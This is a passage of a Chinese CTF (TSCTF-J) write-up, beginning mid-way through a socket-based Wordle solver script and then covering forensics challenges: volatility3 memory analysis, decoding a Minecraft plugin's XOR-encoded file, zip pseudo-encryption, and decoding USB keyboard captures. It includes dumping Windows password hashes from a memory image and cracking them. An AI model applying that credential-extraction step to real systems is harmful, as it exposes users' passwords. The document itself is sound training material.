print(f\u0026#34;{letter}不存在\u0026#34;) self.absence.add(letter) self.absence_copy = self.absence.copy() for letter in self.absence_copy: if letter in self.presence_letter: self.absence.remove(letter) # print(f\u0026#34;{self.presence=}\u0026#34;) # print(f\u0026#34;{self.vague=}\u0026#34;) # print(f\u0026#34;{self.absence=}\u0026#34;) def is_contain_absence_letters(self, word): for c in word: if c in self.absence: return True return False def is_match_presence(self,word): for letter, index in self.presence: if word[index] != letter: return False return True def is_match_vague(self,word): for letter, index in self.vague: if word[index] == letter or letter not in word: return False return True def update_list(self): new_list = [] for word in self.possible: if self.is_contain_absence_letters(word) or not self.is_match_presence( word) or not self.is_match_vague(word): continue new_list.append(word) self.possible = new_list def get_untried(self,words): counter = Counter() tried = self.absence | self.presence_letter all_letter = set(chr(ord(\u0026#39;a\u0026#39;)+i) for i in range(26)) untried = all_letter - tried for w in words: for c in w: if c in untried: counter[c] += 1 return counter def get_freq(self, words): counter = Counter() for w in words: for c in w: counter[c] += 1 return counter def generator(self, attempt): # self.possible.sort(key=lambda x:-len(set(x))) # return random.choice(self.possible[:50]) untried = self.get_untried(self.possible) freq = self.get_freq(self.possible) if len(untried) \u0026gt; 1 and attempt \u0026lt; 5: word_with_score = [] word_list = self.all_word for word in word_list: letters = set(word) untried_score = sum(untried[c] if c in untried else 0 for c in letters) freq_score = sum(freq[c] if c in freq else 0 for c in letters) word_with_score.append((word,untried_score,freq_score)) ranked_words = sorted(word_with_score, key=lambda item:(-item[1],-item[2],item[0])) guess = ranked_words[0][0] else: guess = \\ sorted(self.possible, key=lambda word: (-len(set(word)), -sum(freq[c] for c in word), word))[0] return guess def update(self, guess, feedback): self.update_dict(guess, feedback) self.update_list() # print(f\u0026#34;after update:{len(self.possible)}\u0026#34;) def reset(self): self.possible = self.all_word self.presence = set() self.presence_letter = set() self.vague = set() self.absence = set() solver = WordleSovler(word_list) def play_one_time(sock:socket, solver:WordleSovler,win): if win == 94: sock.sendall(b\u0026#34;every\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 95: sock.sendall(b\u0026#34;smile\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 96: sock.sendall(b\u0026#34;shows\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 97: sock.sendall(b\u0026#34;great\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True if win == 98: sock.sendall(b\u0026#34;power\u0026#34;) print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 return True attempt = 0 while attempt \u0026lt; 6: print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # round消息 guess = solver.generator(attempt) print(f\u0026#34;try:{guess}\u0026#34;) sock.sendall(guess.encode()) feedback = sock.recv(4096).decode().strip() #XXOO- print(feedback) # print(2) if \u0026#34;OOOOO\u0026#34; in feedback: return True if \u0026#34;You lost.\u0026#34; in feedback: return False if \u0026#34;Word not found!\u0026#34; in feedback: try: solver.all_word.remove(guess) solver.possible.remove(guess) except Exception: pass continue solver.update(guess, feedback) attempt += 1 sock = connect_to_wordle_server() feedback = sock.recv(4096).decode() print(f\u0026#34;初次连接：\\n{feedback}\u0026#34;) win = 0 try: while win \u0026lt; 100: print(f\u0026#34;{win=}\u0026#34;) if play_one_time(sock, solver,win): solver.reset() win += 1 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 print(f\u0026#34;msg:{sock.recv(4096).decode()}\u0026#34;) # 不要错过flag消息 except Exception as e: print(f\u0026#34;error:{e}\u0026#34;) sock.close() 学习资料 1-4 纯纯工具送分题\n1 内存镜像是 .elf 格式的，看了一下重新下了个volatility3，旧的不支持 用 vol.exe 查看镜像信息即得 2 用 vol.exe -f dump.elf windows.hashdump得到了密码的hash，在线爆破得到密码提交flag\n3 vol.exe -f dump.elf windows.pslist查看进程 4 vol.exe -f dump.elf windows.filescan | findstr 'flag'\n中间因为路径中有 \\u 的干扰，所以在volatility3中的text_render.py的那一块加了个try-expect\n找到flag.txt之后用vol.exe -f dump.elf windows.dumpfile提取得到flag\n学习资料5 流量分析题+一堆乱七八糟的东西 首先搭建一个MC服务器，登录到服务器，想到题干中的还是说......这个世界的**规则**不一样？想到指令\n用 /help 一查看发现有个/decodeblock指令，用这个指令得到了flag.pcapng，但是用wireshark打不开，用winhex查看了文件头不是很常见，（找出题人要了个hint），说要用到java反编译，用jd-gui看到了插件的源码找到了问题所在\n1 2 3 4 for (int i = 0; i \u0026lt; data.length; i++) data[i] = (byte)(data[i] ^ 0xFF); String base64String = Base64.getEncoder().encodeToString(data); return base64String.getBytes(); 写了个脚本复原\n1 2 3 4 5 6 7 8 9 import base64 with open(\u0026#34;flag.pcapng\u0026#34;,\u0026#34;rb\u0026#34;) as f: data = f.read() data = base64.b64decode(data.decode()) new_data = b\u0026#34;\u0026#34; for i in range(len(data)): new_data += (data[i] ^ 0xFF).to_bytes(1,\u0026#34;big\u0026#34;) with open(\u0026#34;flag_decoded.pcapng\u0026#34;,\u0026#34;wb\u0026#34;) as f: f.write(new_data) 发现又打不开，再看发现是zip的文件头，改了后缀，解压发现要密码。刚开始就拉到最下面看了一眼发现了Is password real?的提示，刚开始还傻傻的试了real和real?，后来意识过来时伪加密，把标志位一改就解压出来了。\n用tshark -r flag.pcapng -T field -e usb.capdata \u0026gt;data.txt提取出数据，在wireshark中分析了好久，应该是键盘数据，但是有0104的也有0100的，查了一下0104的是按住了右alt，0100应该就是松开了，自己试着跟着按了一下，发现打出中文字了。去查原理，发现Windows里面Alt+小键盘输入中文字符的gbk编码可以直接输出字符。立马开写脚本。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 with open(\u0026#34;usbdata.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: data = f.readlines() data = [i.strip() for i in data if i.strip()] keys = [key[:8] for key in data] vaild_keys = [key[-2:] for key in keys if (key[-2:] != \u0026#34;00\u0026#34; or key[:4] == \u0026#34;0100\u0026#34;) ] # print(keys) print(vaild_keys) mapping = {\u0026#34;59\u0026#34;: \u0026#34;1\u0026#34;,\u0026#34;5a\u0026#34;: \u0026#34;2\u0026#34;,\u0026#34;5b\u0026#34;: \u0026#34;3\u0026#34;,\u0026#34;5c\u0026#34;: \u0026#34;4\u0026#34;, \u0026#34;5d\u0026#34;: \u0026#34;5\u0026#34;, \u0026#34;5e\u0026#34;: \u0026#34;6\u0026#34;,\u0026#34;5f\u0026#34;: \u0026#34;7\u0026#34;,\u0026#34;60\u0026#34;: \u0026#34;8\u0026#34;,\u0026#34;61\u0026#34;: \u0026#34;9\u0026#34;, \u0026#34;62\u0026#34;: \u0026#34;0\u0026#34;} nums = [] num = \u0026#34;\u0026#34; for key in vaild_keys: if key == \u0026#34;00\u0026#34;: if num: nums.append(int(num)) num = \u0026#34;\u0026#34; else: num += mapping[key] print(nums) def gbk_char_from_decimal(decimal_code): gbk_bytes = decimal_code.to_bytes(2, byteorder=\u0026#39;big\u0026#39;) char = gbk_bytes.decode(\u0026#39;gbk\u0026#39;) return char chars = [gbk_char_from_decimal(num) for num in nums] print(chars) with open(\u0026#34;decoded.txt\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: f.write(\u0026#34;\u0026#34;.join(chars)) 得到 熊曰：呋食食出魚常住呱嗡和註誘嗄萌喜圖嗚果哞誘類圖家萌偶物冬噗誘哮洞取啽更雜住嘿嗷有呱性發歡洞捕捕哈洞嘶麼肉家嗥嚄果偶很冬我盜物物嚁囑呦嗄肉笨會告覺哞嗷取呆現喜笨寶噤肉冬\n想起宣讲会上说的，是与熊论道的编码，解了一下码得到U2FsdGVkX18Zz1n2/ZeYSxuFpzOndISllRaiaHVfZ9NZfBC4YbUdCpCttVujDi5r用CyberChefbake了一下发现加盐了（找出题人要了一下hint），在MC的告示牌里得到了密钥是nothing，解密AES得到flag\n熟摩棍哥 读了题目立马想到摩斯电码。刚好整个音频里只有冲和冲刺\n一开始把冲对应的.，发现有一个始终找不到对应，就换了一下冲对应到-就对了。翻译完看到===想到是被编码了，直接CyberChef解决。\nWeb set set what(WEB 签到) 在公告里找到了出题人的QQ，把滑动条的max设置成出题人QQ，直接拉到最后得到了flag\n","date":"2024-09-28T11:12:41+08:00","permalink":"https://XiaoYuan-420.gituhub.io/p/tsctf-j-wp/","title":"TSCTF-J wp"}]